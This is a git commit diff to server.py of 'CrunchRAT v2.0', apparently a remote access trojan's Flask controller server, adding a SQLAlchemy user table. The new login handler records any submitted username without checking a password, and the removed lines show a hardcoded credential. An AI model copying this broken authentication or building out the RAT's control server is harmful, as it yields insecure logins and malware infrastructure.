dec571b3bb9bfb9440f5f83eaf42c76014f436a2
t3ntman <t3ntman@gmail.com>
2017-05-23 16:35:37 -0600

    Added in SQLAlchemy code

--- server.py
+++ server.py
@@ -10,12 +10,19 @@ from flask_login import login_required
 from flask_login import login_user
 from flask_login import logout_user
 from flask_login import current_user
+from flask_sqlalchemy import SQLAlchemy
 from gevent.wsgi import WSGIServer
 import os
+
+basedir = os.path.abspath(os.path.dirname(__file__))
 
 # creates Flask application instance
 app = Flask(__name__)
 app.config["SECRET_KEY"] = os.urandom(32)
+app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///" + os.path.join(basedir, "rat.db")
+app.config["SQLALCHEMY_COMMIT_ON_TEARDOWN"] = True
+app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
+db = SQLAlchemy(app)
 
 # creates Flask-Login instance
 login_manager = LoginManager()
@@ -23,23 +30,13 @@ login_manager.session_protection = "strong"
 login_manager.init_app(app)
 
 
-class User(UserMixin):
-    def __init__(self, username, password):
-        self.username = username
-        self.password = password
+class User(db.Model):
+    __tablename__ = "users"
+    id = db.Column(db.Integer, primary_key=True)
+    username = db.Column(db.String(64), unique=True, index=True)
 
-    def is_authenticated(self):
-        return True
-
-
-@login_manager.user_loader
-def load_user(username):
-     # 1. Fetch against the database a user by `id`
-     # 2. Create a new object of `User` class and return it.
-     #u = DBUsers.query.get(id)
-    #return User(u.name,u.id,u.active)
-    return User("hunter", "super_secret_password")
-
+    def __repr__(self):
+        return "<User %r>" % self.username
 
 
 # HTTP 403
@@ -78,15 +75,11 @@ def login_submit():
     username = request.form["username"]
     password = request.form["password"]
 
-    login_user("hunter")
-'''
-    if request.form["password"] == args.password:
-        login_user(("hunter")
-        return "successful authentication"
+    user = User(username=username)
+    db.session.add(user)
 
-    else:
-        return "failed authentication"
-'''
+    #login_user("hunter")
+    return "boop"
 
 
 @app.route("/home")
@@ -99,6 +92,10 @@ def home():
 
 
 if __name__ == "__main__":
+    # creates SQLite database and tables
+    db.create_all()
+
+    # argument configuration and parsing
     parser = argparse.ArgumentParser(prog="server.py",
                                      description="CrunchRAT v2.0")
     parser.add_argument("password",
@@ -106,10 +103,7 @@ if __name__ == "__main__":
                         type=str,
                         help="server password")
 
-    # parses command-line arguments
     args = parser.parse_args()
-
-    logged_in = None
 
     # starts Flask listener
     server = WSGIServer(("0.0.0.0", 80), app)
